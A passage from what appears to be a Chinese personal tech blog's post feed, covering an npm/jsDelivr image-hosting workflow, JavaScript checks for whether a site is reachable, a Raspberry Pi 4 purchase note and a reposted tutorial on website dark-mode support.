class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 